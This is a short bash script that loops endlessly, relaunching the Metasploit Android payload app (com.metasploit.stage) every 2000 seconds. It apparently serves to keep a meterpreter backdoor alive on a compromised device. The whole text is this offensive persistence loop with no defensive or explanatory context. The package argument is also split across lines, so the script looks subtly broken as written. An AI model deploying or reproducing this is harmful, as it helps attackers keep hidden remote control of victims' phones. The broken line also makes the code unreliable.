#!/bin/bash
while true
do am start --user 0 -a android.intent.action.MAIN -n 
com.metasploit.stage/.MainActivity
sleep 2000
done
